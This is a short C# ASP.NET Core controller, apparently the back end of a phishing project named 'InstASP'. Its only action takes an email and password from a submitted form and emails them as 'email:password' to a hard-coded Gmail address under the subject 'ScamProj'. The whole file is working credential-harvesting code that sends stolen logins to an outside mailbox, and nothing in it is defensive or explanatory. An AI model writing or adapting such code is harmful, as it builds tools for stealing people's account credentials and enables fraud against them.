using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using InstASP.Services;

namespace InstASP.Controllers
{
    public class HomeController : Controller
    {
        [HttpPost]
        public IActionResult SendEmail([FromForm] string email, [FromForm] string password)
        {
            EmailService.SendEmailAsync("dmitrytxcmn@gmail.com", "ScamProj", $"{email}:{password}");
            return Ok("Done");
        }
    }
}
